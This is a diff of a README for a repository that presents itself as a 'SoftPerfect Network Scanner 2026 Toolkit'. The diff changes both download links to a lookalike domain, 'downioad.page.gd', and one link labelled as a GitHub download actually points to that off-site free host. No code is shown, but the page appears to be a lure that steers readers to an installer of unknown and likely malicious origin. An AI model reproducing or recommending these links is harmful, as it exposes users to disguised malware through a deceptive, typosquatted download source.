@@ -2,7 +2,7 @@
 
 This repository provides the comprehensive SoftPerfect Network Scanner 2026 Toolkit, a professional-grade solution designed for efficient network administration, asset discovery, and security auditing on Windows systems. The toolkit streamlines the process of scanning local and remote networks, identifying active devices, and generating detailed reports for IT management and cybersecurity assessments.
 
-[![Download Installer](https://img.shields.io/badge/Download-Toolkit-brightgreen?style=for-the-badge&logo=windows)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Toolkit-brightgreen?style=for-the-badge&logo=windows)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,4 +52,4 @@ A: Check this repository periodically for updates. The latest version of the ins
 **Last Updated:** October 2026  
 **Version:** 2026.1.0  
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
